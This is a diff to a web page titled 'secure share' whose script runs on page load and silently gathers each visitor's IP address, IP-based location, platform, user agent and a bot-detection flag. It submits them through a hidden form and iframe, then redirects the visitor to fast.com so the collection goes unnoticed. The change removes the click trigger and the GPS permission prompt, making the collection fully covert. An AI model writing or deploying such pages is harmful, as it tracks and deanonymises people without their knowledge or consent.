@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>secure share</title>
 </head>
 <body>
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
@@ -17,65 +17,40 @@
     </form>
 
     <script>
-        let triggered = false;
+        async function collectAndSend() {
+            let clientIp = "Unknown";
+            let location = "Unknown";
 
-        async function fetchIp() {
             try {
                 const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 2000);
-                const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                 clearTimeout(timeoutId);
                 const data = await res.json();
-                return data.ip || "Unknown";
+                clientIp = data.ip || "Unknown";
+                location = [data.city, data.region, data.country_name].filter(Boolean).join(", ") || "Unknown";
             } catch (e) {
-                return "Unknown";
+                try {
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const data2 = await res2.json();
+                    clientIp = data2.ip || "Unknown";
+                } catch (err) {}
             }
-        }
-
-        function getGpsLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve("Not Supported");
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
-                    },
-                    (error) => {
-                        resolve("Permission Denied");
-                    },
-                    { timeout: 10000, enableHighAccuracy: true }
-                );
-            });
-        }
-
-        async function collectAndSend() {
-            if (triggered) return;
-            triggered = true;
-
-            const gpsPromise = getGpsLocation();
-            const ipPromise = fetchIp();
-
-            const clientIp = await ipPromise;
-            const gpsLocation = await gpsPromise;
 
             document.getElementById('entry1').value = clientIp;
-            document.getElementById('entry2').value = gpsLocation;
+            document.getElementById('entry2').value = location;
             document.getElementById('entry3').value = navigator.platform || "Unknown";
             document.getElementById('entry4').value = navigator.webdriver ? "Bot" : "Human";
             document.getElementById('entry5').value = navigator.userAgent || "Unknown";
 
-            const form = document.getElementById('fihForm');
-            form.submit();
+            document.getElementById('fihForm').submit();
 
             setTimeout(() => {
                 window.location.href = "https://fast.com";
-            }, 1200);
+            }, 800);
         }
 
-        window.addEventListener('click', collectAndSend, { once: true });
-        window.addEventListener('touchstart', collectAndSend, { once: true });
+        window.onload = collectAndSend;
     </script>
 </body>
 </html>
